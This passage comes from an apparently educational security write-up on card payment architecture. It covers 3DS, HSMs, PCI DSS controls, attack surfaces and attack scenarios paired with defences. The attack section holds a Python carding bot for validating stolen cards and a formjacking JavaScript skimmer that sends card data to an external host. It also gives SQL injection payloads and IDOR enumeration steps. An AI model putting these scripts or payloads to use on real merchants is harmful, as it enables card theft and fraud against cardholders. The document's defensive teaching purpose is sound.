  risk_score SMALLINT,               -- 0-100
  idempotency_key UUID UNIQUE,       -- For retry deduplication
  created_at TIMESTAMPTZ DEFAULT NOW(),
  captured_at TIMESTAMPTZ,
  metadata JSONB,                     -- Merchant-provided metadata
  CONSTRAINT valid_status CHECK (
    status IN ('pending','authorized','captured','refunded','voided','declined')
  )
);

-- Audit log — APPEND ONLY
CREATE TABLE transaction_events (
  id BIGSERIAL PRIMARY KEY,
  transaction_id UUID NOT NULL,
  event_type VARCHAR(50) NOT NULL,
  event_data JSONB NOT NULL,
  ip_hash VARCHAR(64),               -- SHA-256(client_ip)
  created_at TIMESTAMPTZ DEFAULT NOW()
  -- NO UPDATE, NO DELETE permissions on this table for any user
);
```

---

### Sync vs. Async Flows

```
SYNCHRONOUS (user waits for result):
  Card entry → Tokenization → Risk scoring → ISO 8583 auth → Response
  Must complete in: <2 seconds (user expectation)
  Failure mode: timeout shown to user

ASYNCHRONOUS (happens after user sees result):
  1. Fraud model batch retraining (ML model improves over time)
  2. Settlement batch processing (end of day)
  3. Chargeback/dispute management (days/weeks)
  4. Notification delivery (webhooks to merchant)
  5. Reconciliation reports
  6. AML (Anti-Money Laundering) analysis
  7. 3DS challenge flow (can be async, user sees redirect)

KAFKA EVENT BUS (connects sync to async):
  Every transaction event is published to Kafka:
  - payment.authorized
  - payment.captured
  - payment.declined
  - payment.refunded
  - chargeback.received

  Consumers:
  - Settlement service (reads payment.authorized events)
  - Notification service (sends webhooks to merchants)
  - Fraud analytics service (trains models on real data)
  - Reporting service (generates dashboards)
  - Compliance service (AML analysis)
```

---

## 5. Authentication & Authorization Flow

### The Three-Level Auth Model

**Level 1: API Key Authentication (Merchant → Payment Processor)**

```
sk_live_AbCdEfGhIjKlMnOpQrStUvWxYz...

This is the merchant's secret API key. It must:
- Be stored in a secrets manager, not in code
- Never appear in client-side JavaScript
- Never appear in logs
- Be rotated if compromised

How Stripe validates:
1. Extract from Authorization header: "Bearer sk_live_..."
2. Hash the key: SHA-256(api_key)
3. Look up hash in database: which merchant is this?
4. Verify: is this key active? is this merchant in good standing?
5. Apply rate limits for this merchant
6. Attach merchant context to request
```

**Level 2: Cardholder Authentication (3D Secure)**

3DS2 is the modern version of 3DS authentication. Let's trace the exact flow:

```
Merchant Checkout Page
    |
    | [Invisible iframe loads from Visa/Mastercard]
    | [Collects device fingerprint data:]
    |   - Browser user agent
    |   - Screen resolution
    |   - Language setting
    |   - Timezone offset
    |   - Browser plugins
    |   - Canvas fingerprint (unique rendering signature)
    v
3DS Requestor Server (Merchant's payment processor)
    |
    | Sends Authentication Request (AReq) to Visa's Directory Server
    | AReq contains: card number, amount, device data, transaction data
    v
Card Network Directory Server (Visa/Mastercard)
    |
    | Routes to Issuer's Access Control Server (ACS)
    v
Issuer ACS (Chase's server)
    |
    | Risk Decision:
    | [FRICTIONLESS]: "I trust this device/transaction" → approve without challenge
    | [CHALLENGE]: "I need to verify the cardholder"
    |
    v
[IF CHALLENGE]:
    |
    | ACS sends challenge back through the iframe
    | User sees: "Verification required by Chase"
    | User's phone receives OTP: "Chase: Your code is 847291"
    | User types 847291 into the challenge window
    |
    | ACS verifies OTP
    | Issues Authentication Value (CAVV/AEVV) — cryptographic proof
    |   of authentication
    v
[Both paths converge]:
    |
    | Authentication Result (ARes) returned to processor
    | ARes.transStatus = "Y" (authenticated) or "N" (failed) or "U" (unavailable)
    |
    | Processor sends to Issuer in authorization:
    |   ECI = 05 (fully authenticated, liability shifted to issuer)
    |   CAVV = "AAABCSIIHOAAAAAAZt256EEAAAAAoA==" (authentication proof)
    |
    v
Issuer sees ECI=05 + CAVV → liability shifts from merchant to issuer
```

**Why liability shifting matters:**
- Without 3DS: Fraudulent CNP transaction → merchant pays the chargeback (~$30/transaction fee + lost goods)
- With 3DS + ECI=05: Fraudulent CNP transaction → issuer pays (they could have caught it during authentication)
- Merchants pay interchange fees and invest in 3DS implementation to avoid chargeback liability

---

### Trust Boundaries in Card Processing

```
CARDHOLDER SIDE (Untrusted):
  - Card holder's browser/app
  - Merchant's front-end code (could be compromised by XSS)
  - The card itself (but chip is cryptographically protected)

MERCHANT SIDE (Low trust):
  - Merchant's server (we trust them as a business partner, but
    they could be breached, so we minimize their PCI exposure)
  - PCI DSS scope: we try to keep raw card data away from them
  - Trust mechanism: API keys, whitelisted IPs, webhook signatures

PROCESSOR (Medium-High trust):
  - Stripe/Adyen/Braintree have their own security posture
  - Audited by QSAs (Qualified Security Assessors) annually
  - Trust mechanism: contractual obligations, network-level controls

CARD NETWORK (High trust):
  - Visa, Mastercard operate with government-level trust
  - Own private networks, not public internet
  - Physical security of VisaNet data centers: extreme

ISSUER (Highest trust for cardholder data):
  - Chase, Bank of America etc. are regulated financial institutions
  - HSMs protect PIN and cryptographic keys
  - Trust mechanism: regulated by OCC, Fed, regulatory audits
```

---

### HSM — The Hardware Root of Trust

An HSM (Hardware Security Module) is a specialized piece of hardware that:

1. **Stores cryptographic keys** — keys never leave the HSM in plaintext
2. **Performs cryptographic operations** — decryption, signing, key derivation
3. **Physically self-destructs** if tampered with — opening the case destroys keys
4. **Logs every operation** — every key use is recorded

```
HSM Architecture:
+----------------------------------------------+
|  TAMPER-PROOF HARDWARE                       |
|                                              |
|  Key Store:                                  |
|    - PIN Encryption Key (PEK)                |
|    - Master Derivation Key                   |
|    - Zone Master Keys                        |
|    (all stored in battery-backed RAM —       |
|     remove power = keys destroyed)           |
|                                              |
|  Crypto Operations:                          |
|    - DES/3DES (legacy PIN blocks)            |
|    - AES-256 (modern encryption)             |
|    - RSA (asymmetric operations)             |
|    - ECDSA (EMV cryptograms)                 |
|                                              |
|  Access Control:                             |
|    - Multi-person authorization for key load |
|    - M-of-N split knowledge (e.g., 3 of 5   |
|      officers must present their card to    |
|      initialize the HSM)                    |
|    - Physical tamper detection               |
+----------------------------------------------+
```

**The ARQC verification in the issuer's HSM:**

When Chase receives an authorization request with ARQC from Alice's chip:

```
ARQC Verification Steps (inside HSM):
1. Receive: PAN, ATC, ARQC, transaction data
2. Derive card-specific key:
   Card_Key = DES3(PAN + ATC, Master_Derivation_Key)
3. Recompute expected ARQC:
   Expected_ARQC = DES3(transaction_data, Card_Key)
4. Compare: Expected_ARQC == Received_ARQC?
   YES: Card is genuine. Proceed.
   NO: Card is counterfeit or data tampered. Decline.
5. Generate ARPC (response cryptogram):
   ARPC = DES3(ARQC XOR Response_Code, Card_Key)
6. Return ARPC to authorization system
```

This entire sequence happens inside the HSM. The master derivation key never exists in the host system's memory.

---

## 6. Data Flow

### What Data Flows Where

```
CARD DATA LIFECYCLE:

Phase 1: Capture (at POS or online)
  Physical: Chip/magstripe → POS terminal → Immediately encrypted
  Online: Browser field → Stripe.js iframe → Encrypted in transit
  Mobile: Apple Pay / Google Pay → Already tokenized before merchant sees it

Phase 2: Tokenization (at payment processor)
  Input: PAN = "5111111111111111" + expiry + CVV
  Output: Token = "tok_1A2b3C4d5E6f7G8h"
  PAN is immediately encrypted and stored in vault
  CVV is NEVER stored anywhere (PCI DSS requirement — Req 3.2)
  Token is what the merchant receives and stores

Phase 3: Authorization routing
  Processor → Card Network: PAN transmitted (encrypted in transit)
  Card Network → Issuer: PAN transmitted (private network)
  Issuer: PAN used for authorization, then ephemeral (no long-term storage of transaction data)

Phase 4: Settlement (batch)
  Processor → Card Network: Truncated PAN (last 4 + hash)
  No full PANs in settlement files

Phase 5: Merchant records
  Merchant stores: last4, card brand, expiry, token
  Merchant NEVER stores: full PAN, CVV, PIN, full magstripe data
```

### Serialization Formats by Layer

| Layer | Format | Rationale |
|---|---|---|
| Browser ↔ Stripe.js | JSON over HTTPS | Standard web format |
| Merchant ↔ Stripe API | JSON/form-encoded over HTTPS | REST API standard |
| Stripe ↔ Card Networks | ISO 8583 binary | Financial industry standard |
| Card Networks internally | Proprietary binary (VisaNet, Banknet) | Optimized for extreme performance |
| Issuer ↔ CBS | ISO 20022 XML or proprietary | Modern financial messaging |
| Settlement files | ISO 8583 batch / CSV (bank-specific) | Legacy batch processing |
| Event bus (Kafka) | Avro or Protobuf | Schema enforcement, compact |
| Merchant webhooks | JSON over HTTPS | Simple integration |

### Data Transformation at Each Stage

```
Stage 1: POS Terminal
  Input:  Chip reads → Binary EMV TLV data
  Process: Parse TLV (Tag-Length-Value format), extract fields
  Output: ISO 8583 binary message

Stage 2: Acquirer
  Input:  ISO 8583 binary from terminal
  Process: Validate fields, add merchant data, route to card network
  Output: ISO 8583 binary forwarded to card network

Stage 3: Card Network
  Input:  ISO 8583 from acquirer
  Process: Route to correct issuer, apply network rules, timestamp
  Output: ISO 8583 forwarded to issuer

Stage 4: Issuer
  Input:  ISO 8583 authorization request
  Process:
    - Parse binary message
    - Decrypt PIN block (HSM operation)
    - Verify ARQC (HSM operation)
    - Query CBS for account status
    - Run fraud model
    - Generate authorization decision
    - Generate ARPC (HSM operation)
  Output: ISO 8583 response (0110) with approval/decline

Stage 5: Return path (reverse of above)
  Each step decodes and re-encodes for the next layer
```

---

## 7. Security Controls

### PCI DSS v4.0 Requirements (Key Technical Controls)

**Requirement 2: Secure Configurations**
```bash
# What PCI requires for all CDE (Cardholder Data Environment) systems:
- All default passwords changed before deployment
- No unnecessary services running (principle of least function)
- All non-console admin access encrypted (SSH, not Telnet)
- Wireless networks: WPA3 + certificate-based auth

# Verification:
nmap -sV --script=banner -p- CDE_HOST
# Should show ONLY: HTTPS (443), SSH (22)
# Should NOT show: Telnet (23), HTTP (80), FTP (21), SNMP (161)
```

**Requirement 3: Protect Stored Cardholder Data**
```
WHAT YOU MAY STORE (with protection):
  ✓ PAN (Primary Account Number) — only if encrypted with strong crypto
  ✓ Cardholder name — with appropriate access controls
  ✓ Service code — with appropriate access controls
  ✓ Expiration date — with appropriate access controls

WHAT YOU MAY NEVER STORE AFTER AUTHORIZATION:
  ✗ Full magnetic stripe data (track data)
  ✗ CAV2/CVC2/CVV2/CID (3-4 digit code on card)
  ✗ PIN/PIN Block
  ✗ ARQC, ARPC, or other cryptographic data

ENCRYPTION REQUIREMENTS:
  - AES-256 minimum
  - Key management: HSM required for production keys
  - Key rotation: at least annually
  - Key custodians: split knowledge (no single person holds complete key)
```

**Requirement 4: Encrypt Transmission**
```
Prohibited:
  - TLS 1.0 (explicitly prohibited by PCI DSS)
  - TLS 1.1 (prohibited)
  - SSL 3.0 (prohibited)
  - Any cipher suite with < 128-bit effective strength

Required:
  - TLS 1.2 minimum
  - TLS 1.3 preferred
  - Strong cipher suites only (AES-GCM, ChaCha20-Poly1305)
  - Certificate must chain to trusted root CA
  - No self-signed certificates for inter-system communication

nginx configuration for PCI compliance:
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:
            ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:
            ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;
ssl_prefer_server_ciphers off;  # TLS 1.3 ignores this anyway
```

**Requirement 6: Develop and Maintain Secure Systems**
```
- WAF (Web Application Firewall) deployed in front of all CDE-facing APIs
- SAST/DAST in CI/CD pipeline
- Dependency scanning (known vulnerable libraries)
- Penetration testing: at least annually + after major changes
- Secure code review: all payment-related code reviewed by security engineer
```

**Requirement 10: Logging and Monitoring**
```
Every event must be logged:
  - All access to cardholder data
  - All admin actions
  - All authentication events (success AND failure)
  - All changes to audit trails

Log retention: 12 months (3 months immediately accessible)

What goes in the logs:
  ✓ Transaction ID, timestamp, merchant ID
  ✓ Authorization decision and reason code
  ✓ Cardholder data: ONLY last4 + truncated PAN (4111XXXXXXXX1111)
  ✗ NEVER: Full PAN, CVV, PIN, encrypted PIN block, ARQC
```

---

### Secrets Management

```
SECRET                          STORAGE               ROTATION
─────────────────────────────────────────────────────────────────
API Keys (merchant auth)        Database (hashed)     On compromise
PIN Encryption Keys             HSM only             Semi-annually
Master Derivation Keys          HSM only             Annually
Zone Master Keys                HSM (split)          Annually, M-of-N ceremony
TLS Private Keys                HSM or Vault          Annually (auto with ACME)
Database Passwords              Secrets Manager       90 days (automated)
JWT Signing Keys                Secrets Manager       Quarterly
Internal Service API Keys       Secrets Manager       Quarterly

KEY CEREMONY (for HSM master keys):
- Required when: initial HSM setup, key expiry, suspected compromise
- Participants: 3-5 "key custodians" (senior executives/security officers)
- No single person has complete knowledge
- Key material is split (Shamir's Secret Sharing): any 3 of 5 custodians
  can reconstruct the key, but no 2 of 5 can
- Video recorded, witnessed by auditors
- Duration: 2-4 hours
```

---

## 8. Attack Surface Mapping

### External Attack Surface

```
INTERNET-ACCESSIBLE ATTACK SURFACE:
═══════════════════════════════════════════════════════════════════

[E1] Payment API Endpoints
  POST /v1/payment_intents              ← Create/authorize payments
  POST /v1/payment_intents/{id}/confirm ← Complete authorization
  POST /v1/refunds                      ← Issue refunds
  POST /v1/payment_methods              ← Store card tokens
  Threats: Carding attacks, data enumeration, API abuse

[E2] Webhook Endpoint
  POST /webhooks/stripe                 ← Receive payment events
  Threats: Forged webhooks without signature validation

[E3] JavaScript SDK (Stripe.js / hosted fields)
  Loaded from: https://js.stripe.com/v3/
  Threats: Script injection, self-hosting (compromises security model)

[E4] 3DS Challenge Interface
  Iframe from card network's domain
  Threats: Clickjacking, phishing overlay

[E5] Cardholder-Facing Endpoints
  GET /payments/{id}/status            ← Check transaction status
  Threats: IDOR (access other users' transactions)

PHYSICAL ATTACK SURFACE:
  [P1] POS Terminals — skimmer attachment, PIN pad replacement
  [P2] ATMs — skimmer + camera attacks
  [P3] HSM physical access — requires armed guards + multi-person access
```

### Internal Attack Surface

```
INTERNAL ATTACK SURFACE (requires network access):
════════════════════════════════════════════════════

[I1] Token Vault API
  Maps tokens to PANs
  Compromise = access to all stored card numbers
  Most protected internal service

[I2] ISO 8583 Gateway
  Translates between internal and card network formats
  Compromise = ability to forge or modify payment messages

[I3] Settlement Service
  Manages fund movements
  Compromise = ability to redirect settlement funds

[I4] Risk Engine
  Manipulating risk scores = fraud goes undetected

[I5] Database (PostgreSQL)
  Compromise = transaction records, though PANs are tokenized

[I6] Kafka Event Bus
  Poisoning events = downstream service corruption
```

### Attack Surface Diagram

```
                        ┌──────────────────────────────────────────────┐
                        │          EXTERNAL ATTACK SURFACE              │
                        │  [E1]API  [E2]Webhooks  [E3]JS  [E4]3DS [E5] │
                        └──────────┬───────────────────────────────────┘
                                   │
                                   │ Internet (Untrusted)
                                   │
                   ┌───────────────▼────────────────────────────────────┐
                   │         WAF + DDoS Protection (Cloudflare / AWS)   │
                   │         Rate Limiting + IP Reputation               │
                   │[TB-1]   Bot Detection + Geofencing                  │
                   └───────────────┬────────────────────────────────────┘
                                   │
                   ┌───────────────▼────────────────────────────────────┐
                   │              API Gateway (nginx/Envoy)              │
                   │         TLS Termination + Auth Header Check         │
                   │[TB-2]   Request Routing + Circuit Breaker           │
                   └────┬──────────┬──────────┬──────────┬─────────────┘
                        │          │          │          │
              ┌─────────▼─┐  ┌─────▼───┐ ┌───▼────┐ ┌──▼──────┐
              │  Payment  │  │  Token  │ │ Risk   │ │ ISO8583 │
              │   Svc     │  │  Vault  │ │ Engine │ │ Gateway │
              │[TB-3]     │  │[MOST    │ │        │ │         │
              │           │  │CRITICAL]│ │        │ │         │
              └─────┬─────┘  └─────────┘ └────────┘ └────┬────┘
                    │                                      │
              ┌─────▼──────────────────────────────────────▼────┐
              │                 Kafka Event Bus                   │
              │[TB-4]           (Internal communications)         │
              └──────────────────────────────────────────────────┘
                    │                           │
              ┌─────▼──────┐            ┌───────▼──────┐
              │ PostgreSQL  │            │    HSM        │
              │ (Txn DB)    │            │  Cluster      │
              │[I5]         │            │[HIGHEST TRUST]│
              └─────────────┘            └──────────────┘
                                                │
                                   ┌────────────▼────────────┐
                              ┌────▼───┐              ┌───────▼──┐
                              │ Visa   │              │Mastercard│
                              │VisaNet │              │ Banknet  │
                              │[PRIVATE│              │[PRIVATE  │
                              │NETWORK]│              │ NETWORK] │
                              └────────┘              └──────────┘

TRUST BOUNDARIES:
  [TB-1] Internet → WAF: ZERO TRUST. Everything untrusted.
  [TB-2] WAF → API Gateway: Semi-trusted. Headers and IPs partially trusted.
  [TB-3] API GW → Services: Trusted (mTLS between services).
  [TB-4] Internal services: High trust, still authenticated with service accounts.
  [HSM]: Highest trust — physical hardware root of trust.
  [Card Networks]: External but extremely high trust — private circuits, contractual.
```

---

## 9. Attack Scenarios (Very Detailed)

### 9.1 — Card Skimming (Physical POS Attack)

**Background for beginners:** A "skimmer" is a device criminals attach to a legitimate card terminal to steal card data.

**Attacker Assumptions:**
- Attacker has physical access to the POS terminal (gas station pump, ATM, restaurant)
- The terminal reads magnetic stripe data
- Target: steal card numbers to sell on dark web carding forums

**Types of skimmers:**

```
Type A: Overlay Skimmer
  - Fits over the card slot
  - Reads magstripe as card is inserted
  - Tiny camera records PIN entry
  - Bluetooth transmits to nearby attacker's phone
  - Difficult to detect without close inspection

Type B: Internal Skimmer (shimmer)
  - Inserted INSIDE the card reader
  - Reads the chip's communication
  - BUT: chip data is encrypted (ARQC) and card-specific
  - Cannot be reused for fraudulent transactions
  - Only works against magstripe fallback

Type C: Terminal Replacement
  - Entire terminal is replaced with attacker's clone
  - Looks identical to legitimate terminal
  - Captures all data including PIN
  - Most dangerous physical attack
```

**Step-by-Step Execution (magstripe skimmer):**

1. Attacker attaches overlay skimmer to gas station pump (10 seconds, unobserved)
2. Victims insert cards → skimmer reads track 1 + track 2 data:
   ```
   Track 1: %B4111111111111111^SMITH/JOHN^2611101000000000000000000000000?
   Track 2: ;4111111111111111=2611101000000000?
   ```
3. Camera captures PIN: "1234"
4. Attacker retrieves skimmer (or downloads data via Bluetooth)
5. Attacker encodes stolen track data onto blank cards ("white plastics")
6. Attacker uses cloned card at a real terminal

**Why chip defeats this:**
- Even if a shimmer captures chip communication: the ARQC is transaction-specific
- ARQC = DES3(amount + date + ATC + unpredictable_number, card_key)
- The unpredictable number from the terminal is different every time
- A captured ARQC cannot be replayed — it's bound to that specific transaction's data

**Where Detection Could Happen:**
- Unusual card reader weight or appearance (visual check)
- Bluetooth LE scanning for unknown transmitters near terminals
- Card network velocity alerts: cards used at pump X then immediately elsewhere
- Terminal anti-tamper sensors (some modern terminals detect physical modification)

**Current state:** Chip-and-PIN adoption has devastated card-present fraud in Europe and Canada. In the US, chip adoption has reduced CP fraud ~80% but magstripe fallback still exists on some terminals.

---

### 9.2 — Carding Attack (Brute Force Card Validation)

**Background:** Criminals buy stolen card lists from dark web marketplaces. Lists may have expired cards or wrong CVVs. They use automated bots to test which cards are valid.

**Attacker Assumptions:**
- Attacker has a list of 100,000 potentially valid card numbers with expirations
- Missing: CVVs (not always stolen), billing addresses
- Goal: Identify which cards are active and purchasable

**Step-by-Step Execution:**

1. Attacker purchases 100,000 card records: $0.01-$0.10 each on dark web = $1,000-$10,000

2. Attacker writes a bot to test cards against merchants with poor fraud controls:
   ```python
   for card in card_list:
       response = requests.post("https://vulnerable-merchant.com/checkout/validate",
           json={
               "card_number": card["pan"],
               "exp": card["expiry"],
               "cvv": "000",  # Try common values
               "amount": 1.00  # Small amount to avoid detection
           }
       )
       if response.json()["status"] == "success":
           print(f"VALID: {card['pan']}")
           valid_cards.append(card)
   ```

3. Bot sends thousands of requests per minute to the merchant's payment API

4. Valid cards are identified → sold on dark web for $5-$50 each
   (verified valid cards are worth much more than unverified card numbers)

**Why This Works on Vulnerable Merchants:**
- No rate limiting on payment attempts
- No CAPTCHA or device fingerprinting
- Small amounts don't trigger issuer fraud systems
- CVV validation skipped or not checked
- IP not restricted (bot uses residential proxy network)

**Where Detection Could Happen:**
- Payment processor (Stripe Radar): abnormally high decline rate from one merchant
- Card network: multiple authorization attempts with different CVVs on same PAN
- Issuer: multiple failed CVV attempts → card automatically locked
- Velocity check: 50 transactions in 1 minute from same merchant = flagged

**Mitigation:**
- Rate limit: max 5 payment attempts per IP per hour
- CAPTCHA on payment form
- Block disposable email domains (fraudsters use fake accounts)
- Require successful CVV check (never allow CVV bypass)
- Monitor decline rate: >20% declines is suspicious

---

### 9.3 — Formjacking / Payment Page Skimming (Digital Equivalent of Physical Skimmer)

**Background:** JavaScript is injected into a merchant's checkout page to steal card data as users type it. This is how Magecart attacks work. British Airways, Ticketmaster, and hundreds of other sites have been hit.

**Attacker Assumptions:**
- Attacker can inject JavaScript into the merchant's page (via compromised CDN, XSS, or direct server breach)
- The merchant captures card data in their own JavaScript (not using hosted fields)
- Attacker wants real card data at the time of entry

**Step-by-Step Execution:**

1. Attacker compromises a third-party library used by the merchant (CDN supply chain attack):
   ```
   Target: analytics-library.js loaded on checkout page
   Method: Compromise the CDN or the library's npm package
   Result: Attacker controls JavaScript running on checkout page
   ```

2. Attacker injects malicious code into the compromised library:
   ```javascript
   // Injected malicious code (looks innocent in minified JS):
   document.addEventListener('DOMContentLoaded', function() {
     // Watch for form submission
     document.querySelector('#payment-form').addEventListener('submit', function(e) {
       // Capture all card data before it's sent
       var cardData = {
         pan: document.querySelector('#card-number').value,
         expiry: document.querySelector('#expiry').value,
         cvv: document.querySelector('#cvv').value,
         name: document.querySelector('#name').value
       };

       // Exfiltrate to attacker's server (disguised as image request)
       new Image().src = 'https://analytics-tracker.com/pixel.gif?' +
         btoa(JSON.stringify(cardData));
     });
   });
   ```

3. Every time a user submits the checkout form, their raw card data is sent to the attacker's server.

4. Attacker collects thousands of real card numbers with valid CVVs — immediately usable for fraud.

**Why This Is Devastating:**
- Card data captured at the moment of legitimate use: CVVs are valid, cards are active
- Cardholder has no idea anything happened
- The legitimate transaction succeeds AND the attacker has the card data
- These cards are immediately usable and sell for top dollar

**Why Hosted Fields Prevent This:**
If the merchant uses Stripe.js hosted fields (iframes from stripe.com):
- Merchant's JavaScript cannot access the iframe contents (same-origin policy)
- Even if malicious JS is injected into the merchant's page, it cannot read card fields
- The card data goes directly from the iframe to Stripe's servers
- No card data ever exists in the merchant page's JavaScript context

**Where Detection Could Happen:**
- Content Security Policy (CSP): block scripts from unauthorized domains
  `Content-Security-Policy: script-src 'self' https://js.stripe.com`
- Subresource Integrity (SRI): verify third-party script hashes
  `<script src="analytics.js" integrity="sha256-EXPECTED_HASH" crossorigin>`
- Browser security monitoring: unusual outbound requests from payment page
- Card network: cards from same merchant used fraudulently immediately after

---

### 9.4 — SQL Injection Against Payment Database

**Attacker Assumptions:**
- Payment application has a vulnerable search endpoint
- Database contains transaction records
- Attacker wants to extract all stored payment data

**Step-by-Step Execution:**

1. Attacker finds a search endpoint that queries the transaction database:
   ```
   GET /api/v1/transactions/search?merchant_id=FRESH001&date=2024-01-15
   ```

2. Attacker tests for SQL injection:
   ```
   GET /api/v1/transactions/search?merchant_id=FRESH001'--
   ```
   If the query is: `SELECT * FROM transactions WHERE merchant_id = 'FRESH001' AND date = '2024-01-15'`
   Injecting `FRESH001'--` → `SELECT * FROM transactions WHERE merchant_id = 'FRESH001'`
   (The `--` comments out the rest of the query)

3. Attacker identifies the number of columns:
   ```
   ?merchant_id=FRESH001' ORDER BY 10--
   ```
   Keep incrementing until an error — tells attacker the table has N columns.

4. Attacker extracts data using UNION injection:
   ```
   ?merchant_id=' UNION SELECT null,null,card_token,card_last4,amount_cents,null,null FROM transactions--
   ```

5. Attacker extracts all transaction records.

**What Attacker Finds (Best Case for Merchant):**
If correctly implemented:
- Tokens (useless without vault key)
- Last 4 digits (not useful for fraud)
- Transaction amounts (privacy breach but not directly useful)
- Merchant IDs, timestamps

**What Attacker Finds (Worst Case — Misconfigured Merchant):**
If merchant stored full PANs (PCI violation):
- Complete card numbers
- This is a catastrophic breach

**Where Detection Could Happen:**
- WAF: SQL injection patterns (`'`, `--`, `UNION`, `SELECT`)
- Database monitoring: unusual query patterns, bulk reads
- IDS (Intrusion Detection System): anomalous query volume
- Application logs: unexpected error patterns

---

### 9.5 — IDOR (Insecure Direct Object Reference) on Transaction IDs

**Background for beginners:** If transaction IDs are sequential numbers (1001, 1002, 1003...), an attacker who can see their own transaction can guess and access other people's transactions.

**Attacker Assumptions:**
- Attacker has a legitimate account with the payment processor
- Transaction IDs are sequential or predictable
- Transaction detail endpoint doesn't verify ownership

**Step-by-Step Execution:**

1. Attacker makes a purchase, receives transaction ID: `txn_1001`
2. Attacker navigates to: `GET /api/v1/transactions/txn_1001` → sees their own data
3. Attacker tries: `GET /api/v1/transactions/txn_1000` → might see another user's transaction!
4. Attacker scripts through transaction IDs: 1000, 999, 998... extracting transaction data for other users

**What This Exposes:**
- Other cardholders' last4, card brand, expiry
- Transaction amounts and merchant names
- If combined with SQL injection: full card tokens

**Prevention:**
```python
# WRONG — vulnerable to IDOR:
def get_transaction(transaction_id: str):
    return db.query("SELECT * FROM transactions WHERE id = $1", transaction_id)

# CORRECT — ownership verification:
def get_transaction(transaction_id: str, requesting_user_id: str):
    txn = db.query("""
        SELECT * FROM transactions
        WHERE id = $1 AND merchant_id IN (
            SELECT merchant_id FROM merchant_users WHERE user_id = $2
        )
    """, transaction_id, requesting_user_id)
    if not txn:
        raise NotFoundOrForbidden()  # Same error for not-found and forbidden
    return txn

# Also: use UUIDs not sequential integers
# "txn_550e8400-e29b-41d4-a716-446655440000" is not guessable
```

---

### 9.6 — Chargeback Fraud (Friendly Fraud)

**Background:** This is not a technical attack — it's abuse of the chargeback mechanism. But it's one of the most financially damaging attacks on merchants.

**Attacker Assumptions:**
- Attacker is a legitimate cardholder
- They make a real purchase with their own card
- After receiving goods/services, they file a chargeback with their bank

**Step-by-Step Execution:**

1. Bob (attacker) orders a $500 laptop from an e-commerce store
2. Laptop is delivered. Bob has it in his hands.
3. Bob calls Chase: "I never received this item" or "This charge is unauthorized"
4. Chase initiates a chargeback process
5. Merchant must respond within 10-30 days with evidence
6. If merchant cannot prove delivery: Chase forces a reversal
7. Merchant loses $500 + chargeback fee ($15-$100) + possible rate increase

**Why This Often Succeeds:**
- For digital goods: hard to prove delivery
- For physical goods without signature confirmation: hard to prove receipt
- Time pressure: merchants often don't respond in time
- Some cardholders know banks favor cardholders

**How Merchants Defend:**
- Require signature confirmation for high-value shipments
- Use 3DS2 to shift liability to issuer
- Maintain detailed delivery logs
- For digital goods: log IP addresses, access times, download records
- Respond to every chargeback with evidence
- Track chargeback-prone customers and blacklist them

---

## 10. Failure Points

### Under Load

**Card Network peak times:**
- Black Friday / Cyber Monday: 10x normal volume
- End of month (bill payments)
- Any major event (concert ticket sale)

**What typically degrades first:**

```
1. Issuer's fraud scoring engine:
   - ML inference under load
   - Some issuers set a "default approve" for low-risk, low-amount transactions
     when their fraud system is saturated (trading security for availability)
   - Others set "default decline" (safer but kills conversion rate)

2. Payment processor's risk engine:
   - Similar ML inference bottleneck
   - Usually cached fraud scores for repeat customers reduce load

3. Card network switching:
   - VisaNet and Banknet are massively over-provisioned
   - Actual card network failure is extremely rare
   - More likely: queue backlog at issuers causing timeouts

4. POS terminal connections:
   - Small merchants' internet connections fail under building-wide load
   - Terminals switch to "offline mode" (floor limit transactions)
```

**Offline mode / floor limits:**
If the terminal cannot reach the acquirer (network down), it can still approve small transactions up to a "floor limit" (e.g., $50). These are later submitted for batch authorization.

Risk: if the card is hot-listed and terminal goes offline, fraudulent transactions up to the floor limit will be approved. Most merchants accept this risk for small amounts to keep checkout flowing.

---

### Under Attack

**DDoS on payment API:**

```
Attack: 1 million requests/second to POST /v1/payment_intents
Goal: Make payment processing unavailable for legitimate users

Defense layers:
1. Cloudflare/Akamai: Absorb volumetric attack at CDN edge
2. Rate limiting: max 100 requests/second per IP
3. Rate limiting: max 1000 requests/minute per API key
4. Geographic filtering: block unusual traffic patterns
5. CAPTCHA for suspicious traffic
6. Circuit breaker: if error rate > 10%, shed load gracefully
```

**Credential stuffing:**
Attackers use leaked credential databases to test API keys.

```
Attack: Try millions of leaked API keys
Goal: Find valid payment API keys to make fraudulent charges

Defense:
1. API keys are hashed in database (not stored plaintext)
2. Failed authentication rate limiting per IP
3. Alert: if a key fails more than 5 times, lock temporarily
4. IP reputation database: known attacker IPs blocked
```

---

### Common Misconfigurations

| Misconfiguration | Risk Level | Impact |
|---|---|---|
| Storing full PAN in database | CRITICAL | PCI breach, massive liability |
| Storing CVV after authorization | CRITICAL | PCI violation, data breach |
| Sequential transaction IDs | HIGH | IDOR attacks |
| No idempotency key support | HIGH | Double charges on retry |
| TLS 1.0/1.1 still enabled | HIGH | PCI non-compliance, MITM risk |
| API key in client-side JavaScript | CRITICAL | Any visitor can make charges |
| No CVV validation | HIGH | Enables carding attacks |
| No rate limiting | HIGH | Carding, brute force, DDoS |
| Missing ARQC validation | CRITICAL | Accepting counterfeit EMV cards |
| No webhook signature validation | HIGH | Forged payment confirmations |
| Using test API key in production | CRITICAL | All charges are fake, no revenue |
| Log full PAN in access logs | CRITICAL | PCI violation, data exposure |

---

## 11. Mitigations

### The PCI DSS Defense-in-Depth Strategy

```
LAYER 1: Reduce Scope (most effective)
  → Use hosted fields (Stripe.js, Adyen Web) to keep PANs away from your systems
  → Use tokenization — never store raw PANs
  → If you don't touch card data, you can't leak it
  → Result: SAQ A instead of SAQ D (dramatically smaller compliance scope)

LAYER 2: Network Security
  → WAF in blocking mode for all cardholder data facing APIs
  → DDoS protection (Cloudflare / AWS Shield Advanced)
  → Network segmentation: CDE isolated from rest of network
  → No direct internet access from CDE servers (only through proxy)
  → Private circuits to card networks (not public internet)

LAYER 3: Application Security
  → Certificate pinning in mobile apps
  → Strict input validation before any processing
  → Parameterized queries everywhere (no string concatenation in SQL)
  → Idempotency on all payment mutations
  → CSP headers preventing unauthorized script execution
  → SRI (Subresource Integrity) for all third-party scripts

LAYER 4: Data Protection
